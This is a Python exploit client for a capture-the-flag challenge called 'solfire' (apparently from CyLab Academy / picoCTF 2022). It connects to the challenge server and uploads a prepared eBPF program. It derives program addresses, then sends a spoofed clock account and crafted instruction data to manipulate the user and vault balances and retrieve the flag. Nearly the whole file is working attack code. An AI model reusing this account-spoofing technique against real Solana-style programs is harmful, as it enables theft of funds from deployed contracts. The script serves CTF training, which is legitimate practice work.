#!/usr/bin/env python3
"""Client for the solfire service (CyLab Academy 302 / picoCTF 2022).

Protocol (from main.rs):
  <- "len: "                 -> send len, then exactly len bytes (our eBPF .so)
  <- "program pubkey: <b58>"
  <- "solve pubkey: <b58>"
  <- "user pubkey: <b58>"
  -> acct count, then "<flags> <pubkey>" lines
  -> ix_data_len, then exactly that many bytes
  <- "user bal: N", "vault bal: N", optionally "congrats!" + "flag: ..."
"""
import argparse
import hashlib
import socket
import sys

ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"


def b58encode(b):
    n = int.from_bytes(b, "big")
    s = ""
    while n:
        n, r = divmod(n, 58)
        s = ALPHABET[r] + s
    pad = len(b) - len(b.lstrip(b"\0"))
    return "1" * pad + s


def b58decode(s):
    n = 0
    for ch in s:
        n = n * 58 + ALPHABET.index(ch)
    body = n.to_bytes((n.bit_length() + 7) // 8, "big") if n else b""
    pad = len(s) - len(s.lstrip("1"))
    return b"\0" * pad + body


P = 2**255 - 19
D = (-121665 * pow(121666, P - 2, P)) % P


def is_curve_point(b):
    """ed25519 CompressedEdwardsY::decompress().is_some()"""
    y = int.from_bytes(b, "little") & ((1 << 255) - 1)
    y %= P
    yy = y * y % P
    u = (yy - 1) % P
    v = (D * yy + 1) % P
    if v == 0:
        return True
    x2 = u * pow(v, P - 2, P) % P
    if x2 == 0:
        return True
    return pow(x2, (P - 1) // 2, P) == 1


PDA_MARKER = b"ProgramDerivedAddress"


def create_program_address(seeds, program_id):
    h = hashlib.sha256()
    for s in seeds:
        h.update(s)
    h.update(program_id)
    h.update(PDA_MARKER)
    digest = h.digest()
    if is_curve_point(digest):
        return None
    return digest


def find_program_address(seeds, program_id):
    for bump in range(255, -1, -1):
        addr = create_program_address(list(seeds) + [bytes([bump])], program_id)
        if addr is not None:
            return addr, bump
    raise RuntimeError("no viable PDA")


CLOCK_FAKE = "C1ock111111111111111111111111111111111111111"
SYSTEM = "11111111111111111111111111111111"


class Conn:
    def __init__(self, host, port, timeout=60):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.buf = b""

    def read_line(self):
        while b"\n" not in self.buf:
            chunk = self.s.recv(4096)
            if not chunk:
                raise EOFError("connection closed; buffer=%r" % self.buf)
            self.buf += chunk
        line, self.buf = self.buf.split(b"\n", 1)
        return line.decode(errors="replace")

    def read_all(self):
        out = self.buf
        self.buf = b""
        self.s.settimeout(8)
        try:
            while True:
                c = self.s.recv(4096)
                if not c:
                    break
                out += c
        except socket.timeout:
            pass
        return out.decode(errors="replace")

    def send(self, data):
        self.s.sendall(data)


def run(host, port, so_path, mode, amount, index, verbose=True):
    so = open(so_path, "rb").read()
    c = Conn(host, port)
    prompt = c.read_line()
    assert prompt.strip() == "len:", prompt
    c.send(str(len(so)).encode() + b"\n")
    c.send(so)

    program_pubkey = c.read_line().split(":")[1].strip()
    solve_pubkey = c.read_line().split(":")[1].strip()
    user_pubkey = c.read_line().split(":")[1].strip()

    ledger, ledger_nonce = find_program_address([], b58decode(solve_pubkey))
    vault, vault_nonce = find_program_address([b"vault"], b58decode(program_pubkey))
    ledger_b58, vault_b58 = b58encode(ledger), b58encode(vault)

    if verbose:
        print(f"program : {program_pubkey}")
        print(f"solve   : {solve_pubkey}")
        print(f"user    : {user_pubkey}")
        print(f"ledger  : {ledger_b58} (nonce {ledger_nonce})")
        print(f"vault   : {vault_b58} (nonce {vault_nonce})")

    metas = [
        ("r", CLOCK_FAKE),
        ("r", SYSTEM),
        ("w", ledger_b58),
        ("w", vault_b58),
        ("ws", user_pubkey),
        ("r", program_pubkey),
    ]
    ix = bytes([ledger_nonce, vault_nonce]) + \
        amount.to_bytes(4, "little") + bytes([mode, 0]) + index.to_bytes(2, "little")

    c.send(f"{len(metas)}\n".encode())
    for flags, pk in metas:
        c.send(f"{flags} {pk}\n".encode())
    c.send(f"{len(ix)}\n".encode())
    c.send(ix)

    out = c.read_all()
    if verbose:
        print("---- server output ----")
        print(out.rstrip())
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="xebec.cylabacademy.net")
    ap.add_argument("--port", type=int, default=22709)
    ap.add_argument("--so", default=r"D:\ctf-index\_z_302\solve.so")
    ap.add_argument("--mode", type=int, default=0)
    ap.add_argument("--amount", type=lambda x: int(x, 0), default=0x10000)
    ap.add_argument("--index", type=lambda x: int(x, 0), default=0x280)
    a = ap.parse_args()
    # sanity: the fake clock key must decode to exactly 32 bytes
    b = b58decode(CLOCK_FAKE)
    print(f"clock fake: {CLOCK_FAKE} -> {len(b)} bytes")
    assert len(b) == 32, "fake C1ock key must be 32 bytes"
    run(a.host, a.port, a.so, a.mode, a.amount, a.index)


if __name__ == "__main__":
    main()
